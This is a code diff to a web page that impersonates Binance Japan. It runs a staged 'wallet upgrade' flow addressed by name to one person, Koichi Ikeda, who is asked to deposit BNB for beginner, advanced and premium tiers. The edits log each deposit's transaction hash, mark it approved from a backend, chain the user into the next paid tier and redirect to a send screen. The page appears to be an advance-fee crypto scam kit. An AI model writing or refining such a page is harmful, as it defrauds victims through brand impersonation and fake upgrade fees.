@@ -359,7 +359,7 @@
                       <span class="relative inline-flex rounded-full h-2 sm:h-2.5 w-2 sm:w-2.5 bg-binance-yellow"></span>
                     </span>
                     <span id="header-stage-badge" class="text-[9px] sm:text-xs font-bold tracking-wide text-binance-yellow uppercase whitespace-nowrap">
-                        BASIC UPGRADE <span class="text-binance-textMuted font-semibold text-[8px] sm:text-[11px] lowercase hidden xs:inline">(minimum)</span>
+                        BEGINNER UPGRADE <span class="text-binance-textMuted font-semibold text-[8px] sm:text-[11px] lowercase hidden xs:inline">(minimum)</span>
                     </span>
                 </div>
 
@@ -763,11 +763,11 @@
         </div>
         
         <h1 id="overlay-header-text" class="text-xl sm:text-3xl font-bold mb-3 uppercase tracking-wide max-w-3xl leading-snug text-white">
-            THANK YOU FOR COMPLETING THE BASIC UPGRADE PROCEDURE KOICHI IKEDA.
+            THANK YOU FOR COMPLETING THE BEGINNER UPGRADE PROCEDURE KOICHI IKEDA.
         </h1>
         
         <p id="overlay-sub-text" class="text-binance-textMuted max-w-lg text-xs sm:text-sm mb-6 sm:mb-8 uppercase tracking-wider font-medium">
-            YOUR BASIC BINANCE JAPAN WALLET IS SUCCESSFUL
+            YOUR BEGINNER BINANCE JAPAN WALLET IS SUCCESSFUL
         </p>
 
         <button id="overlay-proceed-btn" onclick="handleOverlayProceed()" class="w-full sm:w-auto bg-binance-yellow hover:bg-binance-yellowHover text-binance-bgPrimary font-bold px-6 sm:px-8 py-3.5 sm:py-4 rounded-xl transition text-xs sm:text-base shadow-xl shadow-binance-yellow/20 hover:scale-105 active:scale-95">
@@ -810,7 +810,7 @@
         </div>
     </div>
 
-    <script src="New/supabase-config.js"></script>
+    <script src="New/supabase-config.js?v=wallet-upgrade-sync-3"></script>
     <script>
         // Global Loader Helper Function
         function triggerBinanceLoader(title, subtitle, durationMs, callback) {
@@ -851,9 +851,21 @@
         window.lastBnbPrice = 120665;
         window.lastBnbChange = 1.19;
 
+        function getCheckoutUpgradeLevel(submission = {}) {
+            const declaredLevel = String(submission.upgradeLevel || '').toLowerCase();
+            if (declaredLevel === 'basic') return 'beginner';
+            if (declaredLevel && declaredLevel !== 'beginner') return declaredLevel;
+            const amount = Number(String(submission.amount || '').match(/[\d.]+/)?.[0]);
+            if (Number.isFinite(amount) && Math.abs(amount - 2) < 0.001) return 'advanced';
+            if (Number.isFinite(amount) && Math.abs(amount - 2.3) < 0.001) return 'premium';
+            return declaredLevel || 'beginner';
+        }
+
         function applyWalletUpgradeApprovalState() {
-            const status = localStorage.getItem('walletUpgradeApproval');
-            if (status === 'APPROVED') {
+            const submission = JSON.parse(localStorage.getItem('walletUpgradeLastSubmission') || 'null');
+            const submissionLevel = getCheckoutUpgradeLevel(submission || {});
+            const currentLevel = currentStage === 'basic' ? 'beginner' : currentStage;
+            if (submission?.status === 'APPROVED' && submissionLevel === currentLevel) {
                 if (currentStep !== 4) {
                     goToStep(4);
                 }
@@ -870,12 +882,12 @@
             try {
                 const submissions = await listWalletUpgradeSubmissions();
                 const localSubmission = JSON.parse(localStorage.getItem('walletUpgradeLastSubmission') || 'null');
-                const match = submissions.find(item =>
-                    (localSubmission && item.txHash === localSubmission.txHash) ||
-                    item.userEmail === 'wallet-upgrade@customer.local'
-                );
+                if (!localSubmission?.txHash) return;
+                const localLevel = getCheckoutUpgradeLevel(localSubmission);
+                const match = submissions.find(item => item.txHash === localSubmission.txHash && getCheckoutUpgradeLevel(item) === localLevel);
                 if (!match) return;
-                localStorage.setItem('walletUpgradeLastSubmission', JSON.stringify(match));
+                const normalizedMatch = { ...match, upgradeLevel: getCheckoutUpgradeLevel(match) };
+                localStorage.setItem('walletUpgradeLastSubmission', JSON.stringify(normalizedMatch));
                 localStorage.setItem('walletUpgradeStatus', match.status || 'PENDING');
                 if (match.status === 'APPROVED') {
                     localStorage.setItem('walletUpgradeApproval', 'APPROVED');
@@ -896,6 +908,9 @@
 
         // Window Load Handler
         window.onload = function() {
+            const nextLevel = localStorage.getItem('walletUpgradeNextLevel') || 'beginner';
+            if (nextLevel === 'advanced') startAdvancedUpgrade();
+            if (nextLevel === 'premium') startPremiumUpgrade();
             if (applyWalletUpgradeApprovalState()) {
                 return;
             }
@@ -1199,7 +1214,8 @@
             const submission = {
                 id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
                 userName: 'Wallet Upgrade User',
-                userEmail: 'wallet-upgrade@customer.local',
+                userEmail: localStorage.getItem('currentUserEmail') || 'wallet-upgrade@customer.local',
+                upgradeLevel: currentStage === 'basic' ? 'beginner' : currentStage,
                 amount: `${depositBnbAmount} BNB`,
                 senderAddress: userWallet,
                 txHash,
@@ -1293,8 +1309,8 @@
             const proceedBtn = document.getElementById('overlay-proceed-btn');
 
             if (currentStage === 'basic') {
-                headerEl.innerText = "THANK YOU FOR COMPLETING THE BASIC UPGRADE PROCEDURE KOICHI IKEDA.";
-                subEl.innerText = "YOUR BASIC BINANCE JAPAN WALLET IS SUCCESSFUL";
+                headerEl.innerText = "THANK YOU FOR COMPLETING THE BEGINNER UPGRADE PROCEDURE KOICHI IKEDA.";
+                subEl.innerText = "YOUR BEGINNER BINANCE JAPAN WALLET IS SUCCESSFUL";
                 proceedBtn.innerText = "Please kindly click here to proceed";
             } else if (currentStage === 'advanced') {
                 headerEl.innerText = "THANK YOU FOR COMPLETING THE ADVANCE UPGRADE PROCEDURE KOICHI IKEDA.";
@@ -1307,6 +1323,8 @@
             }
 
             overlay.classList.remove('hidden');
+            localStorage.setItem('postUpgradeAction', 'openSendFlow');
+            setTimeout(() => { window.location.href = 'wallet.html'; }, 1500);
         }
 
         function handleOverlayProceed() {
